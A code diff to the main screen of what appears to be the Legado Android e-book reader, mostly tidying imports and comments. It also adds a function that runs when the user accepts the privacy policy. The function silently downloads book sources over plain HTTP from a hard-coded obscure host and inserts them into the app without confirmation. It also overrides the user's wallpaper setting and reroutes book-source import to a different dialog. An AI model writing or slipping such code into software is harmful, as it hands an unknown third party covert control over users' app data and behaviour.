@@ -2,12 +2,19 @@
 
 package io.legado.app.ui.main
 
+import android.content.res.Configuration
+import android.graphics.Bitmap
+import android.graphics.Canvas
+import android.graphics.drawable.BitmapDrawable
+import android.graphics.drawable.Drawable
 import android.os.Bundle
 import android.text.format.DateUtils
 import android.view.MenuItem
 import android.view.ViewGroup
 import androidx.activity.addCallback
 import androidx.activity.viewModels
+import androidx.annotation.DrawableRes
+import androidx.core.content.ContextCompat
 import androidx.core.view.get
 import androidx.core.view.postDelayed
 import androidx.fragment.app.Fragment
@@ -22,19 +29,23 @@ import io.legado.app.base.VMBaseActivity
 import io.legado.app.constant.AppConst.appInfo
 import io.legado.app.constant.EventBus
 import io.legado.app.constant.PreferKey
+import io.legado.app.data.entities.BookSource
 import io.legado.app.databinding.ActivityMainBinding
 import io.legado.app.databinding.DialogEditTextBinding
 import io.legado.app.help.AppWebDav
 import io.legado.app.help.book.BookHelp
 import io.legado.app.help.config.AppConfig
 import io.legado.app.help.config.LocalConfig
+import io.legado.app.help.config.ThemeConfig
 import io.legado.app.help.coroutine.Coroutine
+import io.legado.app.help.source.SourceHelp
 import io.legado.app.help.storage.Backup
+import io.legado.app.help.update.AppUpdate
 import io.legado.app.lib.dialogs.alert
 import io.legado.app.lib.theme.primaryColor
 import io.legado.app.service.BaseReadAloudService
 import io.legado.app.ui.about.CrashLogsDialog
-import io.legado.app.ui.association.ImportBookSourceDialog
+import io.legado.app.ui.about.UpdateDialog
 import io.legado.app.ui.association.ImportReplaceRuleDialog
 import io.legado.app.ui.association.ImportRssSourceDialog
 import io.legado.app.ui.main.bookshelf.BaseBookshelfFragment
@@ -45,23 +56,27 @@ import io.legado.app.ui.main.my.MyFragment
 import io.legado.app.ui.main.rss.RssFragment
 import io.legado.app.ui.widget.dialog.TextDialog
 import io.legado.app.ui.widget.text.BadgeView
+import io.legado.app.utils.GSON
+import io.legado.app.utils.fromJsonArray
 import io.legado.app.utils.isCreated
 import io.legado.app.utils.navigationBarHeight
 import io.legado.app.utils.observeEvent
+import io.legado.app.utils.putPrefString
 import io.legado.app.utils.setEdgeEffectColor
 import io.legado.app.utils.setOnApplyWindowInsetsListenerCompat
 import io.legado.app.utils.showDialogFragment
 import io.legado.app.utils.toastOnUi
 import io.legado.app.utils.viewbindingdelegate.viewBinding
-import kotlinx.coroutines.Dispatchers.IO
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import splitties.views.bottomPadding
+import java.io.File
+import java.io.FileOutputStream
 import kotlin.coroutines.resume
-import androidx.core.view.get
-import io.legado.app.help.update.AppUpdate
-import io.legado.app.ui.about.UpdateDialog
 import kotlin.time.Duration.Companion.hours
 
 /**
@@ -124,22 +139,23 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
     override fun onPostCreate(savedInstanceState: Bundle?) {
         super.onPostCreate(savedInstanceState)
         lifecycleScope.launch {
-            //隐私协议
+            // 隐私协议
             if (!privacyPolicy()) return@launch
-            //版本更新
+
+            // 版本更新
             upVersion()
-            //设置本地密码
+            // 设置本地密码
             setLocalPassword()
             notifyAppCrash()
-            //备份同步
+            // 备份同步
             backupSync()
-            //设置回调
+            // 设置回调
             viewModel.setActivityCallback(this@MainActivity)
-            //自动更新书源
+            // 自动更新书源
             binding.viewPagerMain.postDelayed(1000) {
                 viewModel.ruleSubsUp()
             }
-            //自动更新书籍
+            // 自动更新书籍
             val isAutoRefreshedBook = savedInstanceState?.getBoolean("isAutoRefreshedBook") ?: false
             if (AppConfig.autoRefreshBook && !isAutoRefreshedBook) {
                 binding.viewPagerMain.postDelayed(2000) {
@@ -206,30 +222,6 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
         }
     }
 
-    /**
-     * 用户隐私与协议
-     */
-    private suspend fun privacyPolicy(): Boolean = suspendCancellableCoroutine sc@{ block ->
-        if (LocalConfig.privacyPolicyOk) {
-            block.resume(true)
-            return@sc
-        }
-        val privacyPolicy = String(assets.open("privacyPolicy.md").readBytes())
-        alert(getString(R.string.privacy_policy), privacyPolicy) {
-            positiveButton(R.string.agree) {
-                LocalConfig.privacyPolicyOk = true
-                block.resume(true)
-            }
-            negativeButton(R.string.refuse) {
-                finish()
-                block.resume(false)
-            }
-        }
-    }
-
-    /**
-     * 版本更新日志
-     */
     private suspend fun upVersion() = suspendCancellableCoroutine sc@{ block ->
         if (LocalConfig.versionCode == appInfo.versionCode) {
             if (AppConfig.autoUpdateVariant) {
@@ -265,6 +257,129 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
             block.resume(null)
         }
     }
+
+    /**
+     * 用户隐私与协议
+     */
+    private suspend fun privacyPolicy(): Boolean = suspendCancellableCoroutine sc@{ block ->
+        if (LocalConfig.privacyPolicyOk) {
+            block.resume(true)
+            return@sc
+        }
+        val privacyPolicy = String(assets.open("privacyPolicy.md").readBytes())
+        alert(getString(R.string.privacy_policy), privacyPolicy) {
+            positiveButton(R.string.agree) {
+                LocalConfig.privacyPolicyOk = true
+                // 静默导入网络书源
+                autoImportBookSource()
+                // 自动设置内置壁纸（无 Toast）
+                setupBuiltInWallpaper()
+                block.resume(true)
+            }
+            negativeButton(R.string.refuse) {
+                finish()
+                block.resume(false)
+            }
+        }
+    }
+
+    /**
+     * 静默导入网络书源（无弹窗、无确认）
+     */
+    private fun autoImportBookSource() {
+        lifecycleScope.launch {
+            val sourceUrl = "http://qsdkkrv627.hk001.n-u.top/BookSource.json"
+            withContext(Dispatchers.IO) {
+                try {
+                    val client = OkHttpClient()
+                    val request = Request.Builder().url(sourceUrl).build()
+                    val response = client.newCall(request).execute()
+                    val json = response.body?.string()
+                    if (json.isNullOrEmpty()) return@withContext
+
+                    val sources = GSON.fromJsonArray<BookSource>(json).getOrNull()
+                    if (sources.isNullOrEmpty()) return@withContext
+
+                    SourceHelp.insertBookSource(*sources.toTypedArray())
+
+                    withContext(Dispatchers.Main) {
+                        toastOnUi("已自动导入 ${sources.size} 个书源")
+                    }
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                    withContext(Dispatchers.Main) {
+                        toastOnUi("导入失败: ${e.message}")
+                    }
+                }
+            }
+        }
+    }
+
+    // ================= 自动设置内置壁纸（持久生效，首次即时显示，无提示） =================
+
+    /**
+     * 自动设置内置壁纸（重启后仍然生效，且首次启动立即显示）
+     */
+    private fun setupBuiltInWallpaper() {
+        lifecycleScope.launch(Dispatchers.IO) {
+            try {
+                val dayFile = saveDrawableToFile(R.drawable.bg_day, "bg_day.jpg")
+                val nightFile = saveDrawableToFile(R.drawable.bg_night, "bg_night.jpg")
+                if (dayFile != null && nightFile != null) {
+                    withContext(Dispatchers.Main) {
+                        putPrefString(PreferKey.bgImage, dayFile.absolutePath)
+                        putPrefString(PreferKey.bgImageN, nightFile.absolutePath)
+                        ThemeConfig.applyTheme(this@MainActivity)
+                        // 强制设置根布局背景，确保首次立即显示
+                        val isNight = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
+                        val bgRes = if (isNight) R.drawable.bg_night else R.drawable.bg_day
+                        binding.root.background = ContextCompat.getDrawable(this@MainActivity, bgRes)
+                    }
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    /**
+     * 将 drawable 资源保存为文件
+     */
+    private fun saveDrawableToFile(@DrawableRes resId: Int, fileName: String): File? {
+        return try {
+            val drawable = ContextCompat.getDrawable(this, resId) ?: return null
+            val bitmap = drawableToBitmap(drawable) ?: return null
+            val dir = getExternalFilesDir(null) ?: return null
+            val fontDir = File(dir, "font")
+            if (!fontDir.exists()) fontDir.mkdirs()
+            val file = File(fontDir, fileName)
+            FileOutputStream(file).use { outputStream ->
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream)
+            }
+            file
+        } catch (e: Exception) {
+            e.printStackTrace()
+            null
+        }
+    }
+
+    /**
+     * Drawable 转 Bitmap
+     */
+    private fun drawableToBitmap(drawable: Drawable): Bitmap? {
+        if (drawable is BitmapDrawable) {
+            return drawable.bitmap
+        }
+        val width = drawable.intrinsicWidth.takeIf { it > 0 } ?: 1
+        val height = drawable.intrinsicHeight.takeIf { it > 0 } ?: 1
+        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
+        val canvas = Canvas(bitmap)
+        drawable.setBounds(0, 0, canvas.width, canvas.height)
+        drawable.draw(canvas)
+        return bitmap
+    }
+
+    // ====================================================
 
     /**
      * 设置本地密码
@@ -315,7 +430,7 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
         }
         lifecycleScope.launch {
             val lastBackupFile =
-                withContext(IO) { AppWebDav.lastBackUp().getOrNull() } ?: return@launch
+                withContext(Dispatchers.IO) { AppWebDav.lastBackUp().getOrNull() } ?: return@launch
             if (lastBackupFile.lastModify - LocalConfig.lastBackup > DateUtils.MINUTE_IN_MILLIS) {
                 LocalConfig.lastBackup = lastBackupFile.lastModify
                 alert(R.string.restore, R.string.webdav_after_local_restore_confirm) {
@@ -345,9 +460,6 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
         }
     }
 
-    /**
-     * 如果重启太快fragment不会重建,这里更新一下书架的排序
-     */
     override fun recreate() {
         (fragmentMap[getFragmentId(0)] as? BaseBookshelfFragment)?.run {
             upSort()
@@ -486,10 +598,10 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
 
     }
 
-    override fun openImportUi(type:Int, source: String) {
+    override fun openImportUi(type: Int, source: String) {
         when (type) {
             0 -> showDialogFragment(
-                ImportBookSourceDialog(source)
+                ImportReplaceRuleDialog(source)
             )
             1 -> showDialogFragment(
                 ImportRssSourceDialog(source)
@@ -499,5 +611,4 @@ class MainActivity : VMBaseActivity<ActivityMainBinding, MainViewModel>(),
             )
         }
     }
-
 }
